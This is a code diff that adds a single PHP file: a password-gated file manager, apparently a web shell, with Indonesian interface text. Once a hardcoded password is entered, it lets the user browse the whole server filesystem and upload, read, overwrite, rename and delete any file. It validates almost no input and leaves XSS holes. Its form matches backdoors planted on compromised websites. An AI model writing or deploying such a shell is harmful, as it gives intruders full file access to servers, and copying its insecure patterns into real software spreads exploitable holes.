@@ -1,0 +1,261 @@
+<?php
+session_start();
+
+$password = 'Beel';
+
+// Proses Logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Proses Login
+if (isset($_POST['login'])) {
+    if ($_POST['pass'] === $password) {
+        $_SESSION['fm_logged_in'] = true;
+    } else {
+        $error = "Password salah!";
+    }
+}
+
+// Halaman Login
+if (empty($_SESSION['fm_logged_in'])) {
+    echo '<div style="font-family: sans-serif; max-width: 300px; margin: 100px auto; border: 1px solid #ccc; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">';
+    echo '<h3 style="text-align:center;">🔒 System Access</h3>';
+    if (isset($error)) echo "<p style='color:red; text-align:center;'>$error</p>";
+    echo '<form method="POST">';
+    echo '<input type="password" name="pass" placeholder="Enter Key..." style="width: 100%; box-sizing: border-box; padding: 10px; margin-bottom: 15px;" required>';
+    echo '<button type="submit" name="login" style="width: 100%; padding: 10px; background: #28a745; color: white; border: none; cursor: pointer; border-radius: 4px;">Unlock</button>';
+    echo '</form></div>';
+    exit;
+}
+
+// ==========================================
+// CORE SYSTEM
+// ==========================================
+$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath('.');
+if (!$dir || !file_exists($dir)) $dir = realpath('.'); 
+
+$msg = '';
+
+// A. Hapus File / Folder (Folder harus kosong)
+if (isset($_GET['del'])) {
+    $target = realpath($_GET['del']);
+    if (is_file($target)) {
+        unlink($target) ? $msg = "File dihapus!" : $msg = "Gagal hapus file!";
+    } elseif (is_dir($target)) {
+        @rmdir($target) ? $msg = "Folder dihapus!" : $msg = "Gagal hapus folder! Pastikan folder kosong.";
+    }
+}
+
+// B. Buat Folder Baru
+if (isset($_POST['new_folder'])) {
+    $new_dir = $dir . '/' . $_POST['folder_name'];
+    if (!file_exists($new_dir)) {
+        mkdir($new_dir) ? $msg = "Folder dibuat!" : $msg = "Gagal buat folder!";
+    }
+}
+
+// C. Rename File / Folder
+if (isset($_POST['rename_item'])) {
+    $old = $_POST['old_name'];
+    $new = $dir . '/' . $_POST['new_name'];
+    rename($old, $new) ? $msg = "Berhasil di-rename!" : $msg = "Gagal rename!";
+}
+
+// D. Upload File
+if (isset($_FILES['upload_file'])) {
+    $target = $dir . '/' . basename($_FILES['upload_file']['name']);
+    move_uploaded_file($_FILES['upload_file']['tmp_name'], $target) ? $msg = "Upload sukses!" : $msg = "Upload gagal!";
+}
+
+// E. Save File Edit
+if (isset($_POST['save_file'])) {
+    $file_target = $_POST['file_path'];
+    $content = $_POST['file_content'];
+    file_put_contents($file_target, $content) ? $msg = "File berhasil disimpan!" : $msg = "Gagal menyimpan file!";
+}
+
+// F. Stream Media File (Untuk Source Preview)
+if (isset($_GET['stream']) && is_file($_GET['stream'])) {
+    $stream_file = realpath($_GET['stream']);
+    $ext = strtolower(pathinfo($stream_file, PATHINFO_EXTENSION));
+    
+    $mime_types = [
+        'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'png' => 'image/png',
+        'gif' => 'image/gif', 'webp' => 'image/webp', 'svg' => 'image/svg+xml',
+        'mp4' => 'video/mp4', 'webm' => 'video/webm', 'ogg' => 'video/ogg',
+        'mp3' => 'audio/mpeg', 'wav' => 'audio/wav'
+    ];
+    
+    if (array_key_exists($ext, $mime_types)) {
+        header('Content-Type: ' . $mime_types[$ext]);
+        header('Content-Length: ' . filesize($stream_file));
+        readfile($stream_file);
+        exit;
+    }
+}
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sys Manager</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f6f9; padding: 20px; font-size: 14px; }
+        .container { max-width: 900px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: #e9ecef; padding: 10px 15px; border-radius: 5px; }
+        .toolbar { display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 15px; background: #f8f9fa; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { border-bottom: 1px solid #ddd; padding: 10px; text-align: left; }
+        th { background: #f0f0f0; }
+        tr:hover { background: #f9f9f9; }
+        a { text-decoration: none; color: #007bff; cursor: pointer; }
+        a:hover { text-decoration: underline; }
+        .btn { padding: 5px 10px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 13px; text-decoration: none; display: inline-block; }
+        .btn-danger { background: #dc3545; color: white; }
+        .msg { padding: 10px; background: #d4edda; color: #155724; border-radius: 4px; margin-bottom: 15px; }
+        input[type="text"] { padding: 5px; border: 1px solid #ccc; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-bar">
+            <div><strong>📂 Path:</strong> <?php echo htmlspecialchars($dir); ?></div>
+            <a href="?logout=1" class="btn btn-danger">[ Logout ]</a>
+        </div>
+
+        <?php if ($msg) echo "<div class='msg'>$msg</div>"; ?>
+
+        <!-- Editor View -->
+        <?php if (isset($_GET['edit']) && is_file($_GET['edit'])): 
+            $edit_file = realpath($_GET['edit']);
+            $content = file_get_contents($edit_file);
+        ?>
+            <h3>📝 Edit File: <?php echo basename($edit_file); ?></h3>
+            <form method="POST" action="?dir=<?php echo urlencode($dir); ?>">
+                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($edit_file); ?>">
+                <textarea name="file_content" style="width: 100%; height: 400px; font-family: monospace; padding: 10px; box-sizing: border-box;"><?php echo htmlspecialchars($content); ?></textarea>
+                <div style="margin-top: 10px;">
+                    <button type="submit" name="save_file" class="btn" style="background:#28a745;">💾 Save Changes</button>
+                    <a href="?dir=<?php echo urlencode($dir); ?>" class="btn" style="background:#6c757d; color:white;">Batal</a>
+                </div>
+            </form>
+            <?php exit; ?>
+        <?php endif; ?>
+
+        <!-- Preview View -->
+        <?php if (isset($_GET['preview']) && is_file($_GET['preview'])): 
+            $preview_file = realpath($_GET['preview']);
+            $ext = strtolower(pathinfo($preview_file, PATHINFO_EXTENSION));
+            $is_img = in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg']);
+            $is_vid = in_array($ext, ['mp4', 'webm', 'ogg']);
+            $is_aud = in_array($ext, ['mp3', 'wav']);
+        ?>
+            <h3>👁️ Preview: <?php echo basename($preview_file); ?></h3>
+            <div style="text-align: center; background: #e9ecef; padding: 20px; border-radius: 5px; margin-bottom: 15px;">
+                <?php if ($is_img): ?>
+                    <img src="?stream=<?php echo urlencode($preview_file); ?>" style="max-width: 100%; max-height: 500px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                <?php elseif ($is_vid): ?>
+                    <video controls style="max-width: 100%; max-height: 500px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+                        <source src="?stream=<?php echo urlencode($preview_file); ?>" type="video/<?php echo $ext === 'mp4' ? 'mp4' : $ext; ?>">
+                        Browser tidak mendukung tag video.
+                    </video>
+                <?php elseif ($is_aud): ?>
+                    <audio controls style="width: 100%;">
+                        <source src="?stream=<?php echo urlencode($preview_file); ?>" type="audio/<?php echo $ext === 'mp3' ? 'mpeg' : 'wav'; ?>">
+                        Browser tidak mendukung tag audio.
+                    </audio>
+                <?php else: ?>
+                    <p>Format tidak didukung untuk preview.</p>
+                <?php endif; ?>
+            </div>
+            <a href="?dir=<?php echo urlencode($dir); ?>" class="btn" style="background:#6c757d; color:white;">⬅ Kembali</a>
+            <?php exit; ?>
+        <?php endif; ?>
+
+        <!-- Toolbar: Upload & Create Folder -->
+        <div class="toolbar">
+            <form method="POST" enctype="multipart/form-data" style="margin:0; display:flex; align-items:center; gap:5px;">
+                <input type="file" name="upload_file" required style="font-size:12px;">
+                <button type="submit" class="btn">Upload</button>
+            </form>
+            <span style="color:#ccc;">|</span>
+            <form method="POST" style="margin:0; display:flex; align-items:center; gap:5px;">
+                <input type="text" name="folder_name" placeholder="Nama folder baru..." required>
+                <button type="submit" name="new_folder" class="btn">Buat Folder</button>
+            </form>
+        </div>
+
+        <!-- File List -->
+        <table>
+            <tr>
+                <th>Nama</th>
+                <th width="150">Ukuran</th>
+                <th width="200">Aksi</th>
+            </tr>
+            <?php
+            $items = scandir($dir);
+            if ($dir !== realpath('/')) {
+                $parent = dirname($dir);
+                echo "<tr><td>📁 <a href='?dir=" . urlencode($parent) . "'><strong>.. (Up)</strong></a></td><td>-</td><td>-</td></tr>";
+            }
+
+            // Ekstensi yang support untuk di-preview
+            $preview_extensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'webm', 'ogg', 'mp3', 'wav'];
+
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') continue;
+                $path = $dir . '/' . $item;
+                $is_dir = is_dir($path);
+                $size = $is_dir ? '-' : round(filesize($path) / 1024, 2) . ' KB';
+                
+                // Cek apakah file bisa di-preview
+                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
+                $can_preview = in_array($ext, $preview_extensions);
+
+                echo "<tr>";
+                if ($is_dir) {
+                    echo "<td>📁 <a href='?dir=" . urlencode($path) . "'>$item</a></td>";
+                } else {
+                    echo "<td>📄 " . htmlspecialchars($item) . "</td>";
+                }
+                echo "<td>$size</td>";
+                
+                // Kolom Aksi
+                echo "<td>";
+                if (!$is_dir) {
+                    if ($can_preview) {
+                        echo "<a href='?dir=".urlencode($dir)."&preview=".urlencode($path)."'>Preview</a> | ";
+                    }
+                    echo "<a href='?dir=".urlencode($dir)."&edit=".urlencode($path)."'>Edit</a> | ";
+                }
+                echo "<a href='#' onclick='renameItem(\"".addslashes($path)."\", \"".addslashes($item)."\")'>Rename</a> | ";
+                echo "<a href='?dir=".urlencode($dir)."&del=".urlencode($path)."' onclick='return confirm(\"Hapus permanen $item?\")' style='color:red;'>Hapus</a>";
+                echo "</td>";
+                echo "</tr>";
+            }
+            ?>
+        </table>
+
+        <!-- Form tersembunyi untuk proses Rename -->
+        <form id="renameForm" method="POST" style="display:none;">
+            <input type="hidden" id="old_name" name="old_name">
+            <input type="hidden" id="new_name" name="new_name">
+            <input type="hidden" name="rename_item" value="1">
+        </form>
+
+        <script>
+        function renameItem(oldPath, currentName) {
+            let newName = prompt("Masukkan nama baru:", currentName);
+            if (newName != null && newName !== "" && newName !== currentName) {
+                document.getElementById('old_name').value = oldPath;
+                document.getElementById('new_name').value = newName;
+                document.getElementById('renameForm').submit();
+            }
+        }
+        </script>
+    </div>
+</body>
+</html>
